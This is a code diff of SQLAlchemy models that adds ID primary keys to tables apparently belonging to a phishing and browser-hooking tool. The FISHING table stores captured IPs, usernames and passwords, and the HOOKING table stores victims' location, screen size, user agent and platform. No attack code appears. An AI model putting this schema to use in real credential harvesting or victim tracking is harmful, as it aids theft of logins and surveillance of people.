@@ -17,55 +17,61 @@ class Users(Base):
 
 class APICommand(Base):
     __tablename__ = 'API_COMMAND'
-    email = Column(String(20), ForeignKey('USERS.email'), primary_key=True)
+    ID = Column(String, primary_key=True)
+    email = Column(String(20), ForeignKey('USERS.email'))
     cmd = Column(String(20))
-    output = Column(Text)
     condition = Column(Text)
 
-    def __init__(self, email, cmd, output, condition):
+    def __init__(self, ID, email, cmd, condition):
+        self.ID = ID
         self.email = email
         self.cmd = cmd
-        self.output = output
         self.condition = condition
 
     def __repr__(self):
-        return f"[{self.email}, {self.cmd}, {self.output}, {self.condition}]"
+        return f"[{self.ID},{self.email}, {self.cmd}, {self.condition}]"
 
 class APILink(Base):
     __tablename__ = 'API_LINK'
-    email = Column(String(20), ForeignKey('USERS.email'), primary_key=True)
+    ID = Column(String, primary_key=True)
+    email = Column(String(20), ForeignKey('USERS.email'))
     link = Column(String(20))
     action_type = Column(Text)
-    condition = Column(Text)
+    condition = Column(Integer)
 
-    def __init__(self, email, link, action_type, condition):
+    def __init__(self, ID, email, link, action_type, condition):
+        self.ID = ID
         self.email = email
         self.link = link
         self.action_type = action_type
         self.condition = condition
 
     def __repr__(self):
-        return f"[{self.email}, {self.link}, {self.action_type}, {self.condition}]"
+        return f"[{self.ID},{self.email}, {self.link}, {self.action_type}, {self.condition}]"
 
 class Fishing(Base):
     __tablename__ = 'FISHING'
-    email = Column(String(20), ForeignKey('USERS.email'), primary_key=True)
+    ID = Column(String, primary_key=True)
+    email = Column(String(20), ForeignKey('USERS.email'))
     ip = Column(String(50))
     username = Column(String(50))
     password = Column(String(20))
 
-    def __init__(self, email, ip, username, password):
+    def __init__(self, ID, email, ip, username, password):
+        self.ID = ID
         self.email = email
         self.ip = ip
         self.username = username
         self.password = password
 
     def __repr__(self):
-        return f"[{self.email}, {self.ip}, {self.username}, {self.password}]"
+        return f"[{self.ID},{self.email}, {self.ip}, {self.username}, {self.password}]"
 
 class Hooking(Base):
     __tablename__ = 'HOOKING'
-    email = Column(String(20), ForeignKey('USERS.email'), primary_key=True)
+
+    ID = Column(String, primary_key=True)
+    email = Column(String(20), ForeignKey('USERS.email'))
     ip = Column(String(20))
     lon = Column(Integer)
     lat = Column(Integer)
@@ -77,7 +83,8 @@ class Hooking(Base):
     user_agent = Column(Text)
     platform = Column(String(50))
 
-    def __init__(self, email, ip, lon, lat, screen_h, screen_w, app_name, app_code_name, product_name, user_agent, platform):
+    def __init__(self, ID, email, ip, lon, lat, screen_h, screen_w, app_name, app_code_name, product_name, user_agent, platform):
+        self.ID = ID
         self.email = email
         self.ip = ip
         self.lon = lon
@@ -91,4 +98,4 @@ class Hooking(Base):
         self.platform = platform
 
     def __repr__(self):
-        return f"[{self.email}, {self.ip}, {self.lon}, {self.lat}, {self.screen_h}, {self.screen_w}, {self.app_name}, {self.app_code_name}, {self.product_name}, {self.user_agent}, {self.platform}]"
+        return f"[{self.ID},{self.email}, {self.ip}, {self.lon}, {self.lat}, {self.screen_h}, {self.screen_w}, {self.app_name}, {self.app_code_name}, {self.product_name}, {self.user_agent}, {self.platform}]"
